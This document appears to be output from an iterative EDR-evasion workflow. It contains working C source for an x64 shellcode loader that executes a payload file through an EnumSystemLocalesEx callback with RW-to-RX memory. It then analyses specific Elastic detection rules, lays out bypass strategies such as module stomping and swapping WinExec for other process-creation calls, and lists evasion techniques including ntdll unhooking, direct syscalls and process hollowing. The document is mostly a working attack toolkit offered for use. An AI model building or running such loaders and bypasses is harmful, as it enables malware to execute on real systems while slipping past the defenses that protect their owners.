/*
 * x64 shellcode loader - Iteration 1 (reviewed)
 * Technique: threadless execution via EnumSystemLocalesEx callback
 *            + RW -> RX allocation (no RWX private pages)
 *
 * Build (MSVC x64):
 *   cl /nologo /O2 /GS- loader.c
 *
 * Usage:
 *   loader.exe C:\path\to\calc.bin
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>

/*
 * Callback prototype for EnumSystemLocalesEx.
 * BOOL CALLBACK LocaleEnumProcEx(LPWSTR lpLocaleString, DWORD dwFlags,
 *                                LPARAM lParam);
 * On x64 the default calling convention is the same as CALLBACK, so we can
 * cast the payload pointer directly to LOCALE_ENUMPROCEX.
 */
typedef BOOL (CALLBACK *LOCALE_ENUMPROCEX)(LPWSTR, DWORD, LPARAM);

/* Read the whole file into a heap buffer. Caller frees. */
static unsigned char *read_file(const char *path, size_t *out_size)
{
    FILE *fp = NULL;
    long  sz = 0;
    unsigned char *buf = NULL;
    size_t got = 0;

    if (path == NULL || out_size == NULL) {
        return NULL;
    }

    fp = fopen(path, "rb");
    if (fp == NULL) {
        fprintf(stderr, "[-] fopen failed for %s (errno=%d)\n", path, errno);
        fflush(stderr);
        return NULL;
    }

    if (fseek(fp, 0, SEEK_END) != 0) {
        fclose(fp);
        return NULL;
    }
    sz = ftell(fp);
    if (sz <= 0) {
        fclose(fp);
        fprintf(stderr, "[-] empty or unreadable file\n");
        fflush(stderr);
        return NULL;
    }
    if (fseek(fp, 0, SEEK_SET) != 0) {
        fclose(fp);
        return NULL;
    }

    buf = (unsigned char *)malloc((size_t)sz);
    if (buf == NULL) {
        fclose(fp);
        return NULL;
    }

    got = fread(buf, 1, (size_t)sz, fp);
    fclose(fp);

    if (got != (size_t)sz) {
        fprintf(stderr, "[-] short read (%zu of %ld)\n", got, sz);
        fflush(stderr);
        free(buf);
        return NULL;
    }

    *out_size = (size_t)sz;
    return buf;
}

int main(int argc, char *argv[])
{
    unsigned char *sc = NULL;
    size_t         sc_size = 0;
    LPVOID         mem = NULL;
    DWORD          old_prot = 0;
    SIZE_T         written = 0;
    BOOL           ok = FALSE;

    if (argc < 2) {
        fprintf(stderr, "usage: %s <shellcode.bin>\n", argv[0]);
        fflush(stderr);
        return 1;
    }

    sc = read_file(argv[1], &sc_size);
    if (sc == NULL) {
        return 1;
    }
    printf("[+] loaded %zu bytes from %s\n", sc_size, argv[1]);

    /*
     * Step 1: allocate PAGE_READWRITE (not RWX). Private RW memory is
     * extremely common (heaps, buffers) and does not trip the RWX heuristic.
     */
    mem = VirtualAlloc(NULL, sc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (mem == NULL) {
        fprintf(stderr, "[-] VirtualAlloc(RW) failed: %lu\n", GetLastError());
        fflush(stderr);
        SecureZeroMemory(sc, sc_size);
        free(sc);
        return 1;
    }

    /* Step 2: copy payload into the RW region. */
    for (written = 0; written < sc_size; ++written) {
        ((unsigned char *)mem)[written] = sc[written];
    }
    /* Zero the on-heap copy as a small hygiene step. */
    SecureZeroMemory(sc, sc_size);
    free(sc);
    sc = NULL;

    /*
     * Step 3: flip to PAGE_EXECUTE_READ. This is the classic RW->RX pattern
     * used by legitimate JIT engines; far less suspicious than RWX.
     */
    ok = VirtualProtect(mem, sc_size, PAGE_EXECUTE_READ, &old_prot);
    if (!ok) {
        fprintf(stderr, "[-] VirtualProtect(RX) failed: %lu\n", GetLastError());
        fflush(stderr);
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }

    /*
     * Step 4: threadless execution.
     *
     * EnumSystemLocalesEx invokes the supplied callback synchronously on the
     * calling thread. No CreateThread / CreateRemoteThread / APC / context
     * manipulation is involved. The call stack at payload entry is:
     *
     *     kernel32!EnumSystemLocalesEx
     *       -> payload
     *
     * The callback prototype is:
     *     BOOL CALLBACK fn(LPWSTR, DWORD, LPARAM)
     * which matches the x64 ABI the shellcode expects (rcx, rdx, r8).
     */
    printf("[+] dispatching payload via EnumSystemLocalesEx (threadless)\n");
    fflush(stdout);

    {
        LOCALE_ENUMPROCEX cb = (LOCALE_ENUMPROCEX)mem;
        /* LOCALE_ALL = 0, reserved = 0, lParam = 0 */
        EnumSystemLocalesEx(cb, LOCALE_ALL, 0, NULL);
    }

    /*
     * If the payload returns (typical calc shellcode calls ExitProcess and
     * never comes back), we clean up here.
     */
    printf("[+] payload returned; cleaning up\n");
    fflush(stdout);
    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}

# EDR Rule Gap Analysis — Iteration 1

## Executive Summary of the Failure

Before analyzing rules, the crash itself is informative: **exit code 0xC0000005 (ACCESS_VIOLATION)** occurred *after* the `[+] dispatching payload via EnumSystemLocalesEx` print. The loader's dispatch mechanism was structurally fine — the payload was reached — but the execution model was wrong for the monitored indicators:

- The payload ran from a **private, unbacked RW→RX page** (`VirtualAlloc` + `VirtualProtect`). Elastic's `call_stack_contains_unbacked == true` fires precisely because the callback frame's origin is a non-image-backed private page.
- The **parent** (`pythonw.exe`) had an unbacked frame, and the **child** (`loader_...exe`) matched the "unsigned, freshly created file" predicate of the first rule's `event0`. That is the sequence the rule is built to catch.

The crash is a secondary symptom (likely ABI/stack alignment at the callback boundary, or the payload's `ExitProcess` path interacting with the synchronous `EnumSystemLocalesEx` unwinding). The *detection* is the primary problem to solve.

## Rule 1: Process Creation from Unbacked Memory via Unsigned Parent (5eb295bd-…)

- **Detection_Logic**: A **two-stage sequence** (`sequence by user.id with maxspan=3m`):
  1. `event0` — a process start where the *current* process is unsigned, has a very fresh file (`relative_file_creation_time <= 500` **or** `relative_file_name_modify_time <= 500`), is not SYSTEM, is not in a hardcoded app allowlist, and is not imphash `f34d5f…` (a known VS/`devenv` artifact).
  2. The **real signal** — a subsequent process start where the *parent's* thread stack contains an **unbacked** frame (`process.parent.thread.Ext.call_stack_contains_unbacked == true`) and the parent's `call_stack_summary` matches one of six exact module-chain templates ending in `Unbacked` (or the mscorlib/VB pattern).
  3. It is then joined by `process.parent.entity_id` and gated by: child is a .NET host, **or** child is a `system32/syswow64/windows` exe with `args_count <= 1`, **or** `event0.hash == child.hash`.

- **Known_Exclusions** (from Active Rules Details):
  - `user.id == S-1-5-18` (SYSTEM) — *not usable, we run as user*.
  - `code_signature.status ∈ {trusted, errorExpired, errorCode_endpoint*}` — *not usable per constraints*.
  - Executable allowlist: `Cognex.VisionSolutions.ServiceHost.exe`, `PWPatientXpress.exe`, `JobEngineService.exe` — *not usable, filename fixed*.
  - `pe.imphash == f34d5f2d4577ed6d9ceec516c1f5a744` — *not usable, we can't forge imphash deterministically.*
  - `parent.executable : C:\Program Files\Microsoft Visual Studio\*\Common?\IDE\devenv.exe` — **parent-based exclusion.**
  - **Stack-based exclusion (the exploitable one):** the `call_stack_summary` must match one of **six literal templates**. Anything *not* matching (e.g. a chain with an extra intermediate module, or a chain that resolves to a file-backed image instead of `Unbacked`) fails the predicate.

- **Gap_Detail**:
  1. **`call_stack_contains_unbacked` is the choke point.** It is set when *any* frame in the parent's stack points into memory with no backing file. If we execute the payload from **image-backed executable memory** (a stomped DLL's `.text`, a mapped section, a fiber on a module-backed stack), the flag never becomes `true` — the entire second stage collapses regardless of the summary templates.
  2. **Exact-string summary matching.** Even *with* an unbacked frame, the summary must equal one of six literal chains. A chain like `ntdll.dll|kernelbase.dll|kernel32.dll|someother.dll|Unbacked` does not match. This is a brittle signature, not a behavioral one.
  3. **The `event0` gate is trivially satisfiable but also ignorable** — the rule only fires if stage 2 fires. Killing stage 2 kills the rule.
  4. **Parent-side telemetry.** `process.parent.thread.Ext.*` is populated from the *parent's* stack *at the time the child starts*. Our parent is `pythonw.exe` (the harness). If the harness's stack is clean (no unbacked frame), stage 2 never fires. In Iter 1 the harness *did* have an unbacked frame — likely because the harness itself was launching the loader from a Python process whose stack was resolved as unbacked. **This is an artifact of the test harness, not our loader** — but we should not rely on it, because the rule also matches on the *child's* own stack in other variants.

- **Bypass_Strategy** (same technique, modified dispatch):
  1. **Stop executing from a private unbacked page.** Keep `threadless_injection` (user-preferred) but change the *substrate*: **module stomping** — map a benign DLL (e.g. `C:\Windows\System32\mshtml.dll` or a signed, non-kernel32 module) as a `SEC_IMAGE` section via `NtCreateSection` + `NtMapViewOfSection` (`module_stomping_section_mapping` pattern), then overwrite its `.text` with the payload and mark it `PAGE_EXECUTE_READ`. The executing frame now resolves to a **file-backed image**, so `call_stack_contains_unbacked` stays `false` and Rule 1's stage 2 never matches — **regardless of the summary templates**.
  2. **Do not create a new process at all.** The rule is a *process-creation* sequence. If the payload runs **in-process** via a callback (`EnumSystemLocalesEx`, `EnumWindows`, `CertEnumSystemStore`) with the callback pointer aimed at the stomped module's `.text`, no `event.action == "start"` for a child is emitted → no sequence → no alert. (Iter 1's crash was in the callback path; the fix is to keep the callback but point it at image-backed memory, and ensure the payload's calling convention matches the callback prototype.)
  3. **If a child process is unavoidable**, use `rundll32_hosting`: run the payload DLL under a signed system host (`C:\Windows\System32\rundll32.exe`) so the child's `code_signature.status == "trusted"` and the parent chain is a signed image — both the `event0` predicate *and* the unsigned-parent framing fail. This is an alternative approach, not a modification, and should be a fallback only.

## Rule 3: Potential Process Creation via ShellCode (58b996a5-…)

- **Detection_Logic**: A **single-event** rule (no sequence). It fires when a process starts and:
  1. `process.parent.thread.Ext.call_stack_contains_unbacked == true`, **and**
  2. `process.parent.thread.Ext.call_stack_summary : "*kernel32.dll|Unbacked*"`, **and**
  3. `_arraysearch(process.parent.thread.Ext.call_stack, $entry, $entry.symbol_info : "*kernel32.dll!WinExec*")` — i.e. a frame whose symbol is **`kernel32!WinExec`** must be present on the parent's stack.
  4. Minus signer allowlist (unusable) and three hardcoded `Ponds33` path exclusions (unusable).

- **Known_Exclusions**:
  - `code_signature.subject_name ∈ {GIGA-BYTE, Intuit, Ramsauer…, Aptean, MICRO-STAR}` — *not usable*.
  - `sc.exe` + `svchost.exe` + `"sc start LenovoPcManagerService"` combo — *not usable*.
  - `Ponds33\*` executables — *not usable*.

- **Gap_Detail**:
  1. **`WinExec` on the parent stack is the specific fingerprint.** This rule is *not* about generic unbacked execution — it is about the classic **`WinExec` shellcode-launch pattern** (a common shellcode stub calls `WinExec` to spawn `calc.exe`). Our Iter 1 dispatch used `EnumSystemLocalesEx`, **not `WinExec`**, so the `_arraysearch` for `kernel32!WinExec` should have failed — yet the rule triggered. That means the **`calc.bin` payload itself contains a `WinExec` call** (typical for calc shellcode), and the *parent's* stack at child-start time included that `WinExec` frame because the payload had already executed `WinExec` to spawn the calculator. So the rule fired on the *payload's* API call, surfaced through the parent's stack.
  2. **The `call_stack_summary` template `"*kernel32.dll|Unbacked*"` is a wildcard** — it matches any chain containing `kernel32.dll` followed by `Unbacked`. This is much looser than Rule 1's exact templates. The only hard requirement is the `WinExec` symbol frame.
  3. **The rule is entirely parent-stack-based.** If the payload does **not** call `WinExec` — e.g. it uses `CreateProcessW`, `ShellExecuteEx`, `system`, or spawns via `NtCreateUserProcess` — the `_arraysearch` fails and the rule does not fire.

- **Gap_Detail (actionable)**: The rule is keyed on **one specific API symbol** (`kernel32!WinExec`). Any other process-spawning primitive bypasses it. Additionally, if the payload runs from image-backed memory, `call_stack_contains_unbacked` is `false` and the rule fails at condition 1.

- **Bypass_Strategy**:
  1. **Primary (same-technique modification):** Keep `threadless_injection` but execute from **image-backed memory** (module stomping / mapped section). This sets `call_stack_contains_unbacked == false` → Rule 3 fails at its first condition, independent of `WinExec`.
  2. **Secondary (payload-side):** The payload's process-creation primitive is what puts `WinExec` on the stack. Swap the payload's spawn to a non-`WinExec` API (e.g. `CreateProcessW` / `ShellExecuteExW` / `NtCreateUserProcess`). This is a payload change, not a loader change, but it directly defeats the `_arraysearch` fingerprint. Since the loader just executes bytes from `argv[1]`, this is a **payload-selection** decision for the next iteration.
  3. **Tertiary:** If a child must be spawned, do it from a **signed host** (`rundll32_hosting`) so the parent stack is a signed image and `call_stack_contains_unbacked` is `false`.

**The single highest-leverage change:** stop executing the payload from a private unbacked page. All three rules depend on `process.parent.thread.Ext.call_stack_contains_unbacked == true`. That flag is a direct function of *where the shellcode lives in memory*. Move the shellcode into a **file-backed image section** (module stomping) and the flag goes `false`, collapsing Rules 1, 2, and 3 simultaneously.

**Secondary change:** avoid emitting a child process-start event at all by keeping execution in-process (callback dispatch against the stomped module). This removes the `event.action == "start"` that Rules 1 and 2 sequence on.

**Tertiary change:** the payload's `WinExec` call is the Rule 3 fingerprint. Even with image-backed execution, if the payload calls `WinExec`, Rule 3's `_arraysearch` could still match if `call_stack_contains_unbacked` were true from another source. Selecting a payload that spawns via `CreateProcessW` eliminates this.

### Memory Techniques
- **rwx_allocation**: Allocate memory with PAGE_EXECUTE_READWRITE (RWX) permissions directly. The simplest and most straightforward method of running shellcode. (bypasses: PAGE_EXECUTE_READWRITE memory permitted)
- **RW_to_RX**: Allocate as PAGE_READWRITE, write shellcode, then VirtualProtect to PAGE_EXECUTE_READ. Avoids suspicious RWX permissions. (bypasses: RWX memory detected, PAGE_EXECUTE_READWRITE allocation)
- **module_stomping**: Load legitimate DLL (ex: mshtml.dll, edgehtml.dll. NOT kernel32.dll), locate executable section, overwrite with shellcode. Uses existing executable memory. (bypasses: unbacked memory execution, private memory execution, process creation via shellcode)
- **module_stomping_section_mapping**: Module Stomping via NtCreateSection(SEC_IMAGE)+NtMapViewOfSection. Maps the sacrificial DLL as an image section (file-backed, RX) without a LoadLibrary event; shellcode overwrites the mapped .text in place. Keeps the module off the PEB loader list and makes call-stack module resolution point at a legitimate DLL path. (bypasses: library_load events, unbacked/private memory in call stack, module list scans)
- **module_stomping_fiber**: Module Stomping + Fiber: stomp a mapped image section, then start execution via CreateFiber/SwitchToFiber so no thread-creation telemetry is emitted. Workshop-verified combination that produced no Elastic alerts. (bypasses: thread creation detection, unbacked memory in call stack)
- **thread_hijacking_local**: Thread Hijacking (local): suspend an existing thread in the own process (e.g. created earlier or via CreateThread on a decoy), overwrite its RIP with the payload address via SetThreadContext, resume. Avoids a fresh thread-start pointing at unbacked memory. (bypasses: thread creation call stack rules, CreateThread telemetry)
- **apc_injection**: APC execution (self-injection): QueueUserAPC/NtQueueApcThread the payload address onto an alertable thread in the same process, then enter an alertable wait (SleepEx/WaitForSingleObjectEx). No new thread is created. (bypasses: CreateThread/CreateRemoteThread detection, remote injection rules)
- **threadless_injection** [USER-PREFERRED]: Threadless Injection (local variant): patch an existing function in a loaded module (or an unused callback slot, e.g. window proc) so the payload runs on a normal call path instead of a new thread. Pure-C feasible when targeting the own process; remote-process variants need handle ops and widen the detection surface. (bypasses: thread creation rules, call stack origin checks)
- **heap_execution**: Use HeapCreate + HeapAlloc instead of VirtualAlloc. Less commonly monitored by EDR. (bypasses: VirtualAlloc/VirtualAllocEx detection)
- **fiber_execution**: Use Windows Fiber API (ConvertThreadToFiber, CreateFiber) to execute shellcode in fiber context. (bypasses: thread creation detection)
- **phantom_dll_hollowing**: Map DLL as SEC_IMAGE_NO_EXECUTE, modify in memory, then remap sections as executable. Advanced evasion. (bypasses: module load detection, image section modification)
- **thread_stack_spoofing**: Overwrite the return address on the stack or use synthetic frames to hide the true origin of the execution (e.g., hiding the pointer to unbacked memory). (bypasses: Stack walking, ETW ThreadStart, GetThreadContext calls)
- **dll_side_loading**: DLL side-loading: drop a payload-bearing DLL next to a signed binary that imports it, so execution flows under a trusted image name. (bypasses: image load detection, unsigned module loads)
- **mockingjay**: Mockingjay: reuse an existing PAGE_EXECUTE_READWRITE section inside a signed DLL (e.g. msys-2.0.dll) — no VirtualAlloc/VirtualProtect at all; writes land in image-backed executable memory. (bypasses: VirtualProtect events, unbacked memory in call stack, private memory execution)
- **early_bird_apc**: Early Bird APC: spawn a signed host process suspended and queue an APC before its first thread runs, so the payload executes during process init — potentially before userland EDR hooks install. (bypasses: suspended process creation rules, cross-process alloc/write telemetry)
- **ntdll_unhooking**: NTDLL unhooking: restore ntdll .text bytes from KnownDlls or a clean on-disk copy to remove inline EDR hooks before running the payload. Auxiliary step — combine with a staging technique. (bypasses: userland hook detection, hooked NT API telemetry)
- **direct_syscall**: Direct/indirect syscalls (HellsGate-style): resolve SSNs from ntdll stubs and invoke the kernel without passing through hooked ntdll prologues. Does not affect kernel-level telemetry. (bypasses: hooked NT API telemetry, userland API interception)
- **process_hollowing_remote**: Remote process hollowing (classic T1055): CreateProcess suspended, NtUnmapViewOfSection the original image, write replacement code, redirect entry, resume. Baseline to measure Elastic hollowing-rule coverage. (bypasses: suspended process creation, unmap events, cross-process writes)
- **proxy_function_calls**: Execute sensitive APIs (NtCreateThread, etc.) through 'gadgets' in legitimate DLLs like ntdll.dll or kernel32.dll to evade return address filtering. (bypasses: Direct syscall detection, RIP auditing)
- **process_doppelganging**: Create file transaction, write shellcode, rollback transaction but keep section handle. Execute from transacted memory. (bypasses: file-based detection, process creation monitoring)
- **callback_execution**: Use legitimate callback functions (EnumWindows, EnumSystemLocales, etc.) with shellcode address. (bypasses: direct thread creation, CreateThread detection)

- **atom_bombing**: Atom bombing: store shellcode in the global atom table, then NtQueueApcThread a GlobalGetAtomNameW call into a target thread so the atom content is written inside the target process — no WriteProcessMemory. (bypasses: cross-process write detection, remote injection rules)

### threadless_injection [USER-PREFERRED]
# Threadless Injection (function hooking / callback hijack)

## Goal
Execute shellcode without creating any thread at all — patch a function body or a callback slot that gets invoked on a normal call path.

## Local-process variants (single-exe feasible)
- **Callback slot overwrite**: replace a function pointer our own process already calls — e.g. a window proc (`SetWindowLongPtr(GWLP_WNDPROC)`), a registered `atexit` handler, or a message hook invoked via the message loop.
- **IAT patch**: overwrite an imported-function entry in our own module's IAT (e.g. patch `GetSystemTime`'s slot) then call it — the call goes to the payload.
- **Enum/callback execution**: APIs that invoke a callback synchronously (`EnumWindows`, `EnumDesktopWindows`, `EnumSystemLocalesEx`, `EnumDateFormatsExEx`, `CertEnumSystemStore`) with the payload address as the callback — simplest "threadless" execution of all.

## Remote variant (documented, not recommended for this pipeline)
Patching a function inside a *victim* process requires `OpenProcess` + `VirtualProtectEx` + `WriteProcessMemory` + trigger — every one of those is instrumented. Only useful with strong call-stack hygiene already in place.

## Detection surface (Elastic)
- `VirtualProtect` on a module's `.text`/IAT region and writes into image sections are watched — combine with stomping discipline.
- Exotic callback APIs are rule-catalogued one by one; common `Enum*` calls with a callback pointer into a file-backed (stomped) region are the lowest-noise option.

## Pitfalls
- Payload signature must match the patched callback's calling convention — mismatched prototypes crash after execution.
- Overwriting WNDPROC/IAT needs the write to happen while no other thread uses the slot; for own-process loaders, do it before starting the message loop.
